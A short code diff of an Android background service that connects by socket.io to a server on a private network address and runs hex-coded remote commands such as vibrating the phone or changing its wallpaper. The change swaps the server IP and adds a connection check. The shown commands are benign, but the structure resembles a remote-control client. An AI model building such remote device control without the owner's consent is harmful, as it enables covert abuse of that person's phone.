@@ -20,7 +20,7 @@ import io.socket.emitter.Emitter;
 
 public class MainService extends Service {
 
-    Socket ioSocket = IO.socket(URI.create("http://192.168.71.11:5001"));
+    Socket ioSocket = IO.socket(URI.create("http://192.168.28.11:5001"));
 
 
     @Override
@@ -56,8 +56,10 @@ public class MainService extends Service {
                     ioSocket.on("0xD", vibratePhone);
                     ioSocket.on("0xE", changeWallpaper);
 
-                    ioSocket.connect();
-                    ioSocket.emit("android_connect", jsonObject);
+                    if(!ioSocket.connected()){
+                        ioSocket.connect();
+                        ioSocket.emit("android_connect", jsonObject);
+                    }
 
                 }catch  (Exception ex){
                     Log.i("Socket", ex.getMessage());
